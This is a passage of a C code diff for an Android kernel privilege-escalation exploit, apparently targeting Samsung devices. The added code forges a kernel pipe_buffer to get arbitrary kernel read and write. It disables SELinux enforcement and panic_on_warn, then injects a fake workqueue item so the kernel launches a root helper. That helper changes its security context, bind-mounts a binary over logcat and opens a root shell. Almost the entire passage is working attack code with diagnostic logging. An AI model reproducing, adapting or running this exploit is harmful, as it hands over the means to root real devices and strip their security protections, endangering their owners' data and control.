+             * 1).  The fake pipe_buffer at node+0x28 describes the target
+             * RAM page, so pipe_read() copies kernel memory to userspace
+             * and a CAN_MERGE pipe_write() merges into it.
+             */
+            unsigned long long page = V & ~0x1fffULL;
+            unsigned long long spage = 0;
+            unsigned int poff = 0;
+
+            if (g_pipe_self)
+            {
+                spage = spage_of_linear(page);
+                poff = 0;
+            }
+            else if (g_pipe_target_page)
+            {
+                spage = g_pipe_target_page;
+                poff = g_pipe_target_off;
+            }
+            else
+            {
+                /* default target: the page containing system_unbound_wq */
+                unsigned long long sym_phys = g_kimage_phys +
+                    (SYSTEM_UNBOUND_WQ_STATIC - KERNEL_VA_BASE);
+
+                spage = spage_of_linear(g_base + sym_phys);
+                poff = (unsigned int)(sym_phys & 0xfffULL);
+                logf("[+] readwq phys=%#llx spage=%#llx poff=%#x\n",
+                     sym_phys, spage, poff);
+            }
+
+            if (off + PIPE_BUF_FAKE_OFF + 0x28 > 0x2000)
+            {
+                kill(T, SIGKILL);
+                waitpid(T, NULL, 0);
+                free(payload);
+                payload = NULL;
+                res->retry = 1;
+                return;
+            }
+            /*
+             * Self-parent node (same trick as the fake cred): rb_erase
+             * writes the node address (V+0x78) into pipe->bufs.  The fake
+             * pipe_buffer array therefore starts at the node, and buffer 1
+             * (used because pipe->tail == 1) lives at node+0x28.
+             */
+            build_payload(payload, off, V + 0x78, target);
+            memset(payload + off + PIPE_BUF_FAKE_OFF, 0, 0x28);
+            *(unsigned long long *)(payload + off + PIPE_BUF_FAKE_OFF +
+                                    0x00) = spage;
+            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x08) =
+                poff;
+            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x0c) =
+                g_pipe_write ? 0 : 0x1000;
+            *(unsigned long long *)(payload + off + PIPE_BUF_FAKE_OFF +
+                                    0x10) =
+                ANON_PIPE_BUF_OPS_STATIC + g_slide;
+            *(unsigned int *)(payload + off + PIPE_BUF_FAKE_OFF + 0x18) =
+                g_pipe_write ? 0x10 : 0; /* PIPE_BUF_FLAG_CAN_MERGE */
+            if (g_pipe_self)
+                *(unsigned long long *)(payload + 0x00) =
+                    0x1122334455667788ULL;
+            logf("[+] plant%d pipe page=%#llx node=%#llx poff=%#x "
+                 "spage=%#llx ops=%#llx\n", tag, page, V + 0x78, poff,
+                 spage, ANON_PIPE_BUF_OPS_STATIC + g_slide);
+        }
         else
         {
             build_payload(payload, off, 0, target);
-        }        slab_usage("pre-exec");
+        }
+        slab_usage("pre-exec");
         logf("[+] plant%d V=%#llx fake=%#llx node=%#llx pfn=%#llx "
              "slab=%#llx slide=%#llx recs=%d slab_own=%d/32 base=%#llx\n",
              tag, V, V + 0x78, V + 0x78, pfn, slab_pfn, g_slide,
@@ -1967,23 +2419,25 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (exec_tid_alive)
         {
             /*
-             * Kill the stalled trigger to stop its helpers, but do not
-             * reap it: an unreaped zombie keeps a possibly stale node
-             * untouched, because cleanup_timerqueue() only runs from
-             * release_task().  That makes the retry safe even if the
-             * exec teardown raced with the check above.
+             * Kill the stalled trigger to stop its helpers.  The node may
+             * be stale if the exec teardown raced, so the reap is made safe
+             * first (repair_zombie empties the timer queues), then the
+             * trigger is reaped and no zombie is left behind.
              */
             kill(T, SIGKILL);
             logf("[-] plant%d no zombie (code=%d status=%d, etid=%d "
-                 "still alive); killed, zombie held, retryable\n",
+                 "still alive); killed, repairing+reaping\n",
                  tag, si.si_code, si.si_status, etid);
-            g_held++;
+            repair_zombie(T, T_task, raw, tag);
             res->retry = 1;
             return;
         }
-        logf("[-] plant%d no zombie (code=%d status=%d); holding child\n",
+        logf("[-] plant%d no zombie (code=%d status=%d); repairing+reaping\n",
              tag, si.si_code, si.si_status);
-        g_held++;
+        /* Kill first so no live timer can re-arm a queue leftmost while the
+         * repair writes run; cleanup only happens at reap on this kernel. */
+        kill(T, SIGKILL);
+        repair_zombie(T, T_task, raw, tag);
         return;
     }
     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
@@ -2008,9 +2462,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
             free(payload);
             return;
         }
-        logf("[-] plant%d reap code=%d status=%d not SIGKILL; holding zombie\n",
+        logf("[-] plant%d reap code=%d status=%d not SIGKILL; repairing+reaping\n",
              tag, si.si_code, si.si_status);
-        g_held++;
+        repair_zombie(T, T_task, raw, tag);
         return;
     }
     /*
@@ -2084,11 +2538,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
          * pfn.  Keep the zombie (the stale node is not erased while it is
          * unreaped) and let stage_write pick a new victim.
          */
-        logf("[-] plant%d burst missed; holding zombie; retryable\n", tag);
-        g_held++;
-        /* No erase will use this payload (the zombie is held unreaped), so
-         * reclaim the spray memory now. */
+        logf("[-] plant%d burst missed; repairing+reaping; retryable\n", tag);
+        /* No erase will use this payload (the stale node is not the one the
+         * repair touches), so reclaim the spray memory before the repair's
+         * own plants run against empty pools. */
         drain_spray(mode == 2);
+        repair_zombie(T, T_task, raw, tag);
         res->retry = 1;
         return;
     }
@@ -2133,6 +2588,90 @@ static void run_plant(unsigned long long target, int tag, int mode,
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
          mode == 2 ? "fake" : "zero", target);
     free(payload);
+}
+
+/*
+ * Stable pipe primitive: after the bootstrap plant, pipe->bufs points at
+ * the user page below (through its linear alias), so the fake pipe_buffer
+ * living there is edited from userspace between operations -- no further
+ * timer plants needed.  read(fd) copies out the described kernel page;
+ * write(fd) merges into it (PIPE_BUF_FLAG_CAN_MERGE).
+ */
+static void user_buf_set(unsigned char *page, unsigned long long spage,
+                         unsigned int off, unsigned int len,
+                         unsigned int flags)
+{
+    unsigned char *b = page + PIPE_BUF_FAKE_OFF;
+
+    *(unsigned long long *)(b + 0x00) = spage;
+    *(unsigned int *)(b + 0x08) = off;
+    *(unsigned int *)(b + 0x0c) = len;
+    *(unsigned long long *)(b + 0x10) =
+        ANON_PIPE_BUF_OPS_STATIC + g_slide;
+    *(unsigned int *)(b + 0x18) = flags;
+}
+
+static int user_pipe_read(int fd, unsigned char *page,
+                          unsigned long long addr, void *buf, size_t len)
+{
+    unsigned long long phys;
+    unsigned int off;
+    size_t got = 0;
+
+    if (addr < g_base || addr >= 0xffffffc000000000ULL)
+        return -1;
+    phys = addr - g_base;
+    off = (unsigned int)(phys & 0xfffULL);
+    if (off + len > 0x1000)
+        len = 0x1000 - off;
+    user_buf_set(page, spage_of_linear(addr), off, 0x1000, 0);
+    while (got < len)
+    {
+        ssize_t n = read(fd, (unsigned char *)buf + got, len - got);
+
+        if (n < 0)
+        {
+            if (errno == EINTR)
+                continue;
+            return -1;
+        }
+        if (n == 0)
+            break;
+        got += (size_t)n;
+    }
+    return (int)got;
+}
+
+static int user_pipe_write(int fd, unsigned char *page,
+                           unsigned long long addr, const void *buf,
+                           size_t len)
+{
+    unsigned long long phys;
+    unsigned int off;
+    ssize_t n;
+    int e;
+
+    /* Kernel-image VAs (.data symbols) go through their linear alias.
+     * g_kimage_phys already includes the KASLR slide and callers pass
+     * runtime (slid) VAs, so the slide must not be counted twice. */
+    if (addr >= KERNEL_VA_BASE && addr < KERNEL_VA_BASE + 0x4000000ULL)
+    {
+        phys = (g_kimage_phys - g_slide) + (addr - KERNEL_VA_BASE);
+        addr = g_base + phys;
+    }
+    if (addr < g_base || addr >= 0xffffffc000000000ULL)
+        return -1;
+    phys = addr - g_base;
+    off = (unsigned int)(phys & 0xfffULL);
+    if (off + len > 0x1000)
+        len = 0x1000 - off;
+    user_buf_set(page, spage_of_linear(addr), off, 0, 0x10); /* CAN_MERGE */
+    errno = 0;
+    n = write(fd, buf, len);
+    e = errno;
+    logf("[+] user_pipe_write addr=%#llx off=%#x n=%zd errno=%d\n",
+         addr, off, n, e);
+    return (int)n;
 }
 
 /*
@@ -2311,7 +2850,11 @@ static int setshell_main(const char *mode)
 
         if (!strcmp(mode, "shell"))
         {
-            char *const av[] = {(char *)"sh", (char *)"-i", NULL};
+            /* Print `id` first: front ends (TimerRoot) poll for the
+             * "uid=0(root)" marker to know the shell is live before they
+             * start writing commands to its stdin. */
+            char *const av[] = {(char *)"sh", (char *)"-c",
+                                (char *)"id; exec /system/bin/sh -i", NULL};
 
             execve("/system/bin/sh", av, envp);
         }
@@ -2327,6 +2870,63 @@ static int setshell_main(const char *mode)
     }
     logf("[-] shell exec failed errno=%d\n", errno);
     _exit(5);
+}
+
+/*
+ * UMH helper (runs as /data/local/tmp/samtimer/uhexec via call_usermodehelper,
+ * so this process has a genuine kernel-issued root cred -- no forgery,
+ * and its death is an ordinary exit).  The usermodehelper context has
+ * /dev/null stdio, so redirect to a log first; the parent waits for the
+ * marker file as its readiness signal.  Then hand off to the usual stage
+ * script: init domain, private mount ns, ksud bind-mounted over logcat
+ * (KDP-safe exec), late-load.
+ */
+static int setksu_main(void)
+{
+    int fd;
+
+    fd = open("/data/local/tmp/samtimer/umh-kdp.log",
+              O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0)
+    {
+        (void)dup2(fd, 1);
+        (void)dup2(fd, 2);
+        if (fd > 2)
+            close(fd);
+    }
+    setvbuf(stdout, NULL, _IONBF, 0);
+    logf("[umh] helper start uid=%d ctx=%s enf=%d\n", getuid(), "self",
+         open("/sys/fs/selinux/enforce", O_RDONLY) >= 0 ? 1 : 0);
+    fd = open("/proc/self/attr/current", O_WRONLY);
+    if (fd >= 0)
+    {
+        (void)!write(fd, "u:r:init:s0", 11);
+        close(fd);
+    }
+    if (unshare(CLONE_NEWNS) == 0)
+    {
+        (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
+        (void)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
+                    NULL, MS_BIND, NULL);
+    }
+    /* Readiness marker: the exploit parent polls for this file. */
+    fd = open("/data/local/tmp/samtimer/umh-action.log",
+              O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0)
+        close(fd);
+    {
+        char *const envp[] = {
+            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
+            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
+            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
+            NULL};
+        char *const av[] = {(char *)"sh",
+                            (char *)"/data/local/tmp/ksu_stage.sh", NULL};
+
+        execve("/system/bin/sh", av, envp);
+    }
+    logf("[umh] exec failed errno=%d\n", errno);
+    _exit(127);
 }
 
 static int wait_child_main(const char *mode)
@@ -2419,7 +3019,7 @@ static int wait_child_main(const char *mode)
             {
                 (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
                 logf("[fake] bind rc=%d errno=%d\n",
-                     (int)mount("/data/local/tmp/w/ksud", "/system/bin/logcat",
+                     (int)mount("/data/local/tmp/samtimer/ksud", "/system/bin/logcat",
                                 NULL, MS_BIND, NULL),
                      errno);
             }
@@ -2507,16 +3107,627 @@ static int wait_child_main(const char *mode)
     _exit(5);
 }
 
+/*
+ * Wake an idle system_unbound_wq worker (BuSung-dev/Root-My-Galaxy
+ * reference kick): opening and closing a pty pair queues tty hangup
+ * works on system_unbound_wq, which wakes a pool worker.
+ */
+static int wake_system_unbound(void)
+{
+    char slave_name[128];
+    int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
+    int slave_fd;
+
+    if (master_fd < 0 || grantpt(master_fd) != 0 ||
+        unlockpt(master_fd) != 0 ||
+        ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0)
+    {
+        if (master_fd >= 0)
+            close(master_fd);
+        return 0;
+    }
+    slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
+    if (slave_fd < 0)
+    {
+        close(master_fd);
+        return 0;
+    }
+    close(master_fd);
+    close(slave_fd);
+    return 1;
+}
+
+/*
+ * umhpipe chain (RiosWesley/SamTimer design): the timer plant gives one
+ * controlled 8-byte write, which is used to point pipe->bufs at a fake
+ * pipe_buffer and thereby build a stable kernel read/write primitive on a
+ * user page.  That primitive reads system_unbound_wq -> dfl_pwq ->
+ * worker_pool and links a fake work_struct whose func is
+ * call_usermodehelper_exec_work: the kernel then spawns our helper with a
+ * genuine root cred -- no cred forgery, no DEFEX race, and the helper's
+ * death is an ordinary exit.
+ */
+static int umhpipe_main(unsigned char *raw)
+{
+    struct plant_res r;
+    int pf[2] = {-1, -1};
+    char ch;
+    long n;
+    unsigned char *mark = (unsigned char *)MAP_FAILED;
+    unsigned long long mark_va = 0; /* mark's linear (kernel) alias */
+    unsigned long long marker_pfn = 0;
+    unsigned long long wq = 0, pwq = 0, pool = 0, val = 0;
+    unsigned long long wl_next = 0, wl_prev = 0;
+    unsigned int nw = 0, ni = 0;
+    unsigned char kb[0x400];
+    unsigned long long sym_alias;
+    int ready = 0;
+
+    write_ksu_script();
+    write_umh_script();
+    ensure_pool();
+    ensure_raw();
+    drain_timers();
+    memset(&r, 0, sizeof(r));
+
+    /*
+     * e1s runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
+     * plants take timerqueue_del()'s WARN_ON_ONCE, so the warning must be
+     * defused before the first plant.  The stage script restores it.
+     */
+    if (stage_write(0, 0, "panic_on_warn", raw, NULL, PANIC_ON_WARN_STATIC))
+        park_forever("panic_on_warn pre-plant failed");
+
+    /*
+     * Pre-fault the VMA/page-table before the trace, free the data page
+     * with MADV_DONTNEED, then let the traced marker write allocate the
+     * data page.  The first mm_page_alloc for this pid is therefore the
+     * marker page, not a page table or a pipe buffer page.
+     */
+    mark = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (mark != MAP_FAILED)
+    {
+        (void)madvise(mark, 0x1000, MADV_DONTFORK);
+        *(unsigned long long *)mark = 0xdeadbeefdeadbeefULL;
+        (void)madvise(mark, 0x1000, MADV_DONTNEED);
+    }
+    /* Leave exactly one byte queued so pipe->tail == 1: the fake
+     * pipe_buffer then lives at node+0x28 (buffer slot 1). */
+    for (int pa = 0; pa < 3 && !g_pipe_addr; pa++)
+    {
+        if (pa)
+        {
+            if (pf[0] >= 0)
+                close(pf[0]);
+            if (pf[1] >= 0)
+                close(pf[1]);
+            pf[0] = pf[1] = -1;
+            logf("[+] pipe leak retry %d\n", pa + 1);
+        }
+        set_pipe_events(1);
+        trace_start();
+        if (mark != MAP_FAILED)
+            *(unsigned long long *)mark = 0x1122334455667788ULL;
+        if (pipe(pf) != 0)
+            park_forever("pipe() failed");
+        (void)!write(pf[1], "A", 1);
+        (void)!read(pf[0], &ch, 1);
+        (void)!write(pf[1], "A", 1);
+        usleep(20000);
+        trace_stop();
+        set_pipe_events(0);
+        n = read_cpu(g_cpu, raw, 48u << 20);
+        logf("[+] piperead trace n=%ld\n", n);
+        if (n > 0)
+            scan_pipe_alloc(raw, (size_t)n, getpid());
+    }
+    if (!g_pipe_addr)
+        park_forever("pipe addr leak failed");
+    logf("[+] pipe=%#llx fds=%d/%d\n", g_pipe_addr, pf[0], pf[1]);
+    {
+        unsigned long long upfn = 0;
+        unsigned long long cands[16];
+        int pc = 0;
+
+        if (n > 0)
+            pc = scan_page_alloc_pfns(raw, (size_t)n, getpid(),
+                                      cands, 16);
+        if (pc > 0)
+            upfn = cands[0];
+        logf("[+] pipe user pfn=%#llx recs=%d\n", upfn, pc);
+        if (!upfn)
+            park_forever("user page pfn leak failed");
+        marker_pfn = upfn;
+
+        /*
+         * The first order-0 allocation is not guaranteed to be our
+         * marker page (page tables/pipe pages can land first).  Read the
+         * marker value back from each candidate through the pipe plant
+         * before trusting its pfn.
+         */
+        {
+            unsigned long long verified = 0;
+
+            for (int k = 0; k < pc && k < 16; k++)
+            {
+                struct plant_res vr;
+                unsigned long long mval = 0;
+                ssize_t rn;
+                unsigned long long pfn = cands[k];
+                int vok = 0;
+
+                for (int tr = 0; tr < 3 && !vok; tr++)
+                {
+                    memset(&vr, 0, sizeof(vr));
+                    g_pipe_target_page =
+                        spage_of_linear(g_base + (pfn << 12));
+                    g_pipe_target_off = 0;
+                    g_pipe_write = 0;
+                    logf("[+] verify marker candidate %d pfn=%#llx "
+                         "try=%d\n", k, pfn, tr + 1);
+                    run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &vr,
+                              raw, 0);
+                    if (vr.ok)
+                        vok = 1;
+                    else if (!vr.retry)
+                        break;
+                }
+                if (!vok)
+                    continue;
+                errno = 0;
+                rn = read(pf[0], &mval, sizeof(mval));
+                logf("[+] marker candidate %d read n=%zd val=%#llx\n",
+                     k, rn, mval);
+                if (rn == 8 && mval == 0x1122334455667788ULL)
+                {
+                    verified = pfn;
+                    break;
+                }
+            }
+            if (!verified)
+                park_forever("marker pfn verify failed");
+            marker_pfn = verified;
+            logf("[+] marker pfn verified=%#llx\n", marker_pfn);
+        }
+    }
+
+    /*
+     * Bootstrap: one plant whose fake pipe_buffer points at the pipe's own
+     * page with CAN_MERGE; the 8-byte write then merges the user page's
+     * linear address into pipe->bufs.  From then on pipe->bufs points at
+     * our user page, which is stable, and all reads/writes edit the fake
+     * pipe_buffer there from userspace.  No more fragile plants.
+     */
+    {
+        unsigned long long pipe_page = g_pipe_addr & ~0xfffULL;
+        unsigned int pipe_off =
+            (unsigned int)((g_pipe_addr + PIPE_INFO_BUF_OFF) & 0xfffULL);
+        int bn, berr;
+
+        if (mark == (unsigned char *)MAP_FAILED || !marker_pfn ||
+            !g_slide_set)
+            park_forever("umh missing bootstrap state");
+        mark_va = g_base + (marker_pfn << 12);
+        memset(mark, 0, 0x1000);
+        user_buf_set(mark, spage_of_linear(pipe_page), pipe_off, 0, 0x10);
+        g_pipe_target_page = spage_of_linear(pipe_page);
+        g_pipe_target_off = pipe_off;
+        g_pipe_write = 1;
+        logf("[+] umh bootstrap plant pipe=%#llx page=%#llx off=%#x "
+             "mark=%p markva=%#llx pfn=%#llx\n", g_pipe_addr, pipe_page,
+             pipe_off, mark, mark_va, marker_pfn);
+        for (int ba = 0; ba < 5 && !r.ok; ba++)
+        {
+            memset(&r, 0, sizeof(r));
+            run_plant(g_pipe_addr + PIPE_INFO_BUF_OFF, 1, 6, &r, raw, 0);
+            if (!r.ok && !r.retry)
+                break;
+        }
+        if (!r.ok)
+            park_forever("umh bootstrap plant failed");
+        errno = 0;
+        bn = (int)write(pf[1], &mark_va, sizeof(mark_va));
+        berr = errno;
+        logf("[+] umh pipe->bufs=%#llx write n=%d errno=%d orig=%#llx\n",
+             mark_va, bn, berr, g_pipe_bufs);
+        if (bn != (int)sizeof(mark_va))
+            park_forever("umh pipe bufs bootstrap failed");
+    }
+
+    /* All following operations use the user-page fake buffer.  The kernel
+     * phys base is a bootloader constant; validate it read-only -- only a
+     * candidate whose wq slot reads back as a linear pointer is accepted,
+     * and nothing is written until it matches. */
+    {
+        static const unsigned long long cands[] = { KERNEL_PHYS_CANDIDATES };
+        int found = 0;
+
+        for (unsigned i = 0;
+             i < sizeof(cands) / sizeof(cands[0]) && !found; i++)
+        {
+            g_kimage_phys = cands[i] + g_slide;
+            sym_alias = alias_of_kimg(SYSTEM_UNBOUND_WQ_STATIC);
+            if (user_pipe_read(pf[0], mark, sym_alias, &wq, 8) != 8)
+                continue;
+            logf("[+] umh phys-cand %#llx -> wq=%#llx\n", cands[i], wq);
+            if (wq >= g_base && wq < 0xffffffc000000000ULL)
+                found = 1;
+        }
+        if (!found)
+            park_forever("umh bad wq (no kernel phys candidate matched)");
+    }
+    logf("[+] umh wq=%#llx (kimage_phys=%#llx)\n", wq, g_kimage_phys);
+    if (user_pipe_read(pf[0], mark, wq, kb, 0x200) != 0x200)
+        park_forever("umh wq page read failed");
+    pwq = *(unsigned long long *)(kb + WQ_DFL_PWQ_OFF);
+    logf("[+] umh pwq=%#llx (dfl_pwq off %#x)\n", pwq, WQ_DFL_PWQ_OFF);
+    if (pwq < g_base || pwq >= 0xffffffc000000000ULL)
+        park_forever("umh bad pwq");
+    if (user_pipe_read(pf[0], mark, pwq, kb, 0x100) != 0x100)
+        park_forever("umh pwq page read failed");
+    pool = *(unsigned long long *)(kb + PWQ_POOL_OFF);
+    val = *(unsigned long long *)(kb + PWQ_WQ_OFF);
+    if (val != wq)
+        park_forever("umh pwq->wq mismatch");
+    logf("[+] umh pool=%#llx\n", pool);
+    if (pool < g_base || pool >= 0xffffffc000000000ULL)
+        park_forever("umh bad pool");
+    for (int t = 0; t < 6; t++)
+    {
+        if (user_pipe_read(pf[0], mark, pool, kb, 0x80) != 0x80)
+            park_forever("umh pool page read failed");
+        wl_next = *(unsigned long long *)(kb + POOL_WORKLIST_OFF);
+        wl_prev = *(unsigned long long *)(kb + POOL_WORKLIST_OFF + 8);
+        nw = *(unsigned int *)(kb + POOL_NR_WORKERS_OFF);
+        ni = *(unsigned int *)(kb + POOL_NR_IDLE_OFF);
+        if (wl_next == pool + POOL_WORKLIST_OFF &&
+            wl_prev == pool + POOL_WORKLIST_OFF && ni > 0)
+            break;
+        logf("[+] umh pool busy t=%d next=%#llx prev=%#llx "
+             "workers=%u idle=%u\n", t, wl_next, wl_prev, nw, ni);
+        usleep(100000);
+    }
+    logf("[+] umh worklist next=%#llx prev=%#llx workers=%u idle=%u\n",
+         wl_next, wl_prev, nw, ni);
+    if (wl_next != pool + POOL_WORKLIST_OFF ||
+        wl_prev != pool + POOL_WORKLIST_OFF || ni == 0)
+        park_forever("umh pool busy");
+
+    if (g_umh_dry)
+    {
+        /* Restore pipe->bufs before parking: nothing else will. */
+        if (g_pipe_bufs)
+            user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_INFO_BUF_OFF,
+                            &g_pipe_bufs, sizeof(g_pipe_bufs));
+        logf("[+] UMH_DRY_READY wq=%#llx pwq=%#llx pool=%#llx\n",
+             wq, pwq, pool);
+        park_forever("umh dry run -- offsets validated, not injecting");
+    }
+
+    if (access(ROOT_UMH_PATH, X_OK) != 0)
+        park_forever("umh helper " ROOT_UMH_PATH
+                     " missing (stage it first)");
+    /*
+     * Injection (BuSung-dev/Root-My-Galaxy reference design): the fake
+     * work uses the REAL pwq -- work->data = pwq | color<<4 | 5 -- and
+     * the real pwq's counters are incremented exactly like __queue_work
+     * does, so no fake pool_workqueue is needed.  The list publish is two
+     * ordered single-pointer writes (prev first, then next) so a worker
+     * never observes a half-linked node.  Everything the kernel follows
+     * is a linear address; the bytes themselves live in our user page.
+     */
+    unsigned long long pub_entry = 0, pub_worklist = 0;
+    unsigned long long rb_inflight_addr = 0;
+    unsigned int rb_inf = 0, rb_act = 0, rb_ref = 0;
+    {
+        unsigned long long work = mark_va + 0x100;
+        unsigned long long entry = work + WORK_ENTRY_OFF;
+        unsigned long long data = mark_va + ROOT_UMH_DATA_OFF;
+        unsigned long long worklist = pool + POOL_WORKLIST_OFF;
+        struct umh_kernel_data ud;
+        unsigned long long *w;
+        unsigned int color = 0, refcnt = 0, nr_active = 0, max_active = 0;
+        unsigned int nr_inflight = 0, v32;
+        unsigned long long inflight_addr;
+        unsigned char zero = 0;
+        unsigned long long n8;
+        int sn, wn;
+
+        if (user_pipe_read(pf[0], mark, pwq + PWQ_WORK_COLOR_OFF,
+                           &color, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_REFCNT_OFF,
+                           &refcnt, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_NR_ACTIVE_OFF,
+                           &nr_active, 4) != 4 ||
+            user_pipe_read(pf[0], mark, pwq + PWQ_MAX_ACTIVE_OFF,
+                           &max_active, 4) != 4)
+            park_forever("umh pwq state read failed");
+        if (color >= 16 || refcnt == 0 || nr_active >= max_active)
+            park_forever("umh bad pwq state");
+        inflight_addr = pwq + PWQ_NR_IN_FLIGHT_OFF +
+                        (unsigned long long)color * 4;
+        if (user_pipe_read(pf[0], mark, inflight_addr,
+                           &nr_inflight, 4) != 4)
+            park_forever("umh nr_inflight read failed");
+        logf("[+] umh pwq state color=%u refcnt=%u active=%u/%u "
+             "inflight=%u\n", color, refcnt, nr_active, max_active,
+             nr_inflight);
+
+        memset(&ud, 0, sizeof(ud));
+        snprintf(ud.path, sizeof(ud.path), "%s", ROOT_UMH_PATH);
+        snprintf(ud.path + 16, sizeof(ud.path) - 16, "%s",
+                 ROOT_UMH_ARG);
+        snprintf(ud.uid, sizeof(ud.uid), "%u", (unsigned)getuid());
+        {
+            unsigned long long completion_addr =
+                data + __builtin_offsetof(struct umh_kernel_data,
+                                          completion);
+            unsigned long long path_addr =
+                data + __builtin_offsetof(struct umh_kernel_data, path);
+            unsigned long long arg_addr =
+                data + __builtin_offsetof(struct umh_kernel_data, arg);
+            unsigned long long uid_addr =
+                data + __builtin_offsetof(struct umh_kernel_data, uid);
+            unsigned long long argv_addr =
+                data + __builtin_offsetof(struct umh_kernel_data, argv);
+
+            ud.completion.next = completion_addr +
+                __builtin_offsetof(struct umh_completion, next);
+            ud.completion.prev = ud.completion.next;
+            ud.argv[0] = path_addr;
+            ud.argv[1] = path_addr + 16;
+            ud.argv[2] = 0;
+            ud.argv[3] = 0;
+            ud.envp[0] = 0;
+        }
+        memcpy((unsigned char *)mark + ROOT_UMH_DATA_OFF, &ud,
+               sizeof(ud));
+        w = (unsigned long long *)((unsigned char *)mark + 0x100);
+        memset(w, 0, 0x70);
+        w[0] = pwq | ((unsigned long long)color << 4) | 5;
+        w[1] = worklist;
+        w[2] = worklist;
+        w[3] = UMH_EXEC_WORK_STATIC + g_slide; /* func */
+        w[6] = data + __builtin_offsetof(struct umh_kernel_data,
+                                         completion);
+        w[7] = data + __builtin_offsetof(struct umh_kernel_data, path);
+        w[8] = data + __builtin_offsetof(struct umh_kernel_data, argv);
+        w[9] = data + __builtin_offsetof(struct umh_kernel_data, envp);
+        /* wait = 0 (UMH_NO_WAIT): the kernel kfree's the info after exec. */
+        *(int *)((unsigned char *)w + 48 + 32) = 0;
+
+        /*
+         * SELinux permissive for the helper's late-load: a precise one
+         * byte zero of selinux_state.enforcing -- initialized (+2) is
+         * never touched.  Verified from userspace right after.
+         */
+        {
+            char enf[8] = "?";
+            int efd;
+
+            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+            if (efd >= 0)
+            {
+                (void)read(efd, enf, sizeof(enf) - 1);
+                close(efd);
+            }
+            logf("[+] umh enforce before=%c\n", enf[0]);
+        }
+        sn = user_pipe_write(pf[1], mark,
+                             SELINUX_STATE_STATIC + g_slide, &zero, 1);
+        {
+            char enf[8] = "?";
+            int efd;
+
+            efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+            if (efd >= 0)
+            {
+                (void)read(efd, enf, sizeof(enf) - 1);
+                close(efd);
+            }
+            logf("[+] umh selinux write n=%d enforce now=%c\n", sn,
+                 enf[0]);
+        }
+
+        /* __queue_work-equivalent accounting on the real pwq. */
+        v32 = nr_inflight + 1;
+        wn = user_pipe_write(pf[1], mark, inflight_addr, &v32, 4);
+        v32 = nr_active + 1;
+        wn += user_pipe_write(pf[1], mark, pwq + PWQ_NR_ACTIVE_OFF, &v32, 4);
+        v32 = refcnt + 1;
+        wn += user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF, &v32, 4);
+        logf("[+] umh counters written n=%d\n", wn);
+        pub_entry = entry;
+        pub_worklist = worklist;
+        rb_inflight_addr = inflight_addr;
+        rb_inf = nr_inflight;
+        rb_act = nr_active;
+        rb_ref = refcnt;
+
+        /*
+         * Publish: prev first (the list still reads empty when walked
+         * from next), verify, then next is the publish point.  A real
+         * queue_work can land between the busy-check and the prev write;
+         * the old prev is restored in that case, because a half-linked
+         * head makes the worker's list_del on that work trip
+         * __list_del_entry_valid -- a guaranteed panic.
+         */
+        n8 = entry;
+        {
+            unsigned long long old_prev = 0, chk = 0;
+
+            if (user_pipe_read(pf[0], mark, worklist + 8,
+                               &old_prev, 8) != 8)
+                park_forever("umh worklist prev read failed");
+            if (old_prev != worklist)
+                park_forever("umh worklist busy before publish");
+            wn = user_pipe_write(pf[1], mark, worklist + 8, &n8, 8);
+            if (user_pipe_read(pf[0], mark, worklist, &chk, 8) != 8 ||
+                chk != worklist)
+            {
+                unsigned int rv32;
+
+                user_pipe_write(pf[1], mark, worklist + 8, &old_prev, 8);
+                rv32 = rb_inf;
+                user_pipe_write(pf[1], mark, rb_inflight_addr, &rv32, 4);
+                rv32 = rb_act;
+                user_pipe_write(pf[1], mark, pwq + PWQ_NR_ACTIVE_OFF,
+                                &rv32, 4);
+                rv32 = rb_ref;
+                user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF,
+                                &rv32, 4);
+                park_forever("umh worklist busy before publish "
+                             "(prev + counters rolled back)");
+            }
+        }
+        wn += user_pipe_write(pf[1], mark, worklist, &n8, 8);
+        logf("[+] umh user work=%#llx entry=%#llx data=%#llx "
+             "func=%#llx wl=%#llx publish=%d\n",
+             work, entry, data, UMH_EXEC_WORK_STATIC + g_slide,
+             worklist, wn);
+    }
+    /*
+     * Wake an idle pool worker: opening and closing a pty pair queues tty
+     * hangup works on system_unbound_wq (the reference kick), which wakes
+     * a worker that then processes our linked item.
+     */
+    for (int round = 0; round < 8 && !ready; round++)
+    {
+        int wk = wake_system_unbound();
+
+        if (round < 2 || wk == 0)
+            logf("[+] umh wake round=%d pty=%d\n", round, wk);
+        for (int j = 0; j < 250; j++)
+        {
+            if (access("/data/local/tmp/samtimer/umh-action.log", F_OK) == 0)
+            {
+                ready = 1;
+                break;
+            }
+            usleep(40000);
+        }
+    }
+    logf(ready ? "UMHPIPE_STARTED\n" : "UMHPIPE_MISSING\n");
+    {
+        /* Diagnostics read straight from our own mapping: the kernel
